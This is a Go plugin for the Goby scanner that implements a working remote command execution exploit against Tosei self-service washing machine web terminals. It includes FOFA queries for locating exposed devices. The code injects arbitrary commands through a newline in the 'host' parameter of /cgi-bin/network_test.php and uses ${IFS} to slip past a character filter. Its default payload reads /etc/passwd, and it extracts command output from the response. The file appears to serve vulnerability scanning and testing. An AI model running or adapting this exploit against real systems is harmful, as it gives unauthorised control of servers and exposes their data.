package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tosei self-service washing machine web management terminal network_test.php host remote command execute Vulnerability",
    "Description": "<p>The Tosei self-washing machine is a product of the Japanese company Tosei.</p><p>The web management terminal of Tosei self-service washing machine has a security vulnerability. Attackers can use the vulnerability to execute code writing backdoors on the server through command injection of network_test.php to obtain server permissions and control the entire server.</p>",
    "Product": "Tosei self-service washing machine",
    "Homepage": "https://www.tosei-corporation.co.jp/product-coin/",
    "DisclosureDate": "2023-03-06",
    "Author": "635477622@qq.com",
    "FofaQuery": "body=\"tosei_login_check.php\" && body=\"TOSEI\"",
    "GobyQuery": "body=\"tosei_login_check.php\" && body=\"TOSEI\"",
    "Level": "3",
    "Impact": "<p>An attacker can use this vulnerability to write arbitrary code to the backdoor of the server, gain server permissions, and then control the entire server.</p>",
    "Recommendation": "<p>1, the official temporarily not to repair the vulnerability, please contact the manufacturer to repair: <a href=\"https://www.tosei-corporation.co.jp/product-coin/\">https://www.tosei-corporation.co.jp/product-coin/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Tosei 自助洗衣机 web 管理端 network_test.php 文件 host 参数远程命令执行漏洞",
            "Product": "Tosei 自助洗衣机",
            "Description": "<p>Tosei 自助洗衣机 是日本 Tosei 公司的一个产品。</p><p>Tosei 自助洗衣机 web 管理端存在安全漏洞，攻击者利用该漏洞可以通过 network_test.php 的命令执行,在服务器任意执行代码，获取服务器权限，进而控制整个服务器。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.tosei-corporation.co.jp/product-coin/\">https://www.tosei-corporation.co.jp/product-coin/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器任意执行命令，获取服务器权限，进而控制整个服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Tosei self-service washing machine web management terminal network_test.php host remote command execute Vulnerability",
            "Product": "Tosei self-service washing machine",
            "Description": "<p>The Tosei self-washing machine is a product of the Japanese company Tosei.</p><p>The web management terminal of Tosei self-service washing machine has a security vulnerability. Attackers can use the vulnerability to execute code writing backdoors on the server through command injection of network_test.php to obtain server permissions and control the entire server.</p>",
            "Recommendation": "<p>1, the official temporarily not to repair the vulnerability, please contact the manufacturer to repair: <a href=\"https://www.tosei-corporation.co.jp/product-coin/\">https://www.tosei-corporation.co.jp/product-coin/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>An attacker can use this vulnerability to write arbitrary code to the backdoor of the server, gain server permissions, and then control the entire server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10836"
}`

	sendPayloadH59ooijLJIJ := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/cgi-bin/network_test.php")
		postConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Data = payload
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}
	//过滤; , < > ? # *,无base64,xxd,od
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			payload := "host=%0acat${IFS}/etc/passwd%0a&command=ping"
			if resp, err := sendPayloadH59ooijLJIJ(hostInfo, payload); err == nil {
				return regexp.MustCompile("(?s)root:(.*?):0:0:").MatchString(resp.Utf8Html)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cmd = strings.ReplaceAll(cmd, " ", "${IFS}")
			payload := "host=%0a" + cmd + "%0a&command=ping"
			resp, err := sendPayloadH59ooijLJIJ(expResult.HostInfo, payload)
			if err != nil || resp.StatusCode != 200 {
				return expResult
			}
			results := ""
			startIndex := strings.Index(fmt.Sprintf("%x", resp.Utf8Html), "3c54443e3c5052453e")
			if startIndex != -1 {
				tempString, _ := hex.DecodeString(fmt.Sprintf("%x", resp.Utf8Html)[startIndex+20:])
				results = string(tempString)
			}
			lastIndex := strings.LastIndex(fmt.Sprintf("%x", results), "0a3c62722f3e3c2f5052453e3c2f54443e0a3c2f")
			if lastIndex != -1 {
				tempString, _ := hex.DecodeString(fmt.Sprintf("%x", results)[:lastIndex])
				results = string(tempString)
			}
			expResult.Output = results
			expResult.Success = true
			return expResult
		},
	))
}
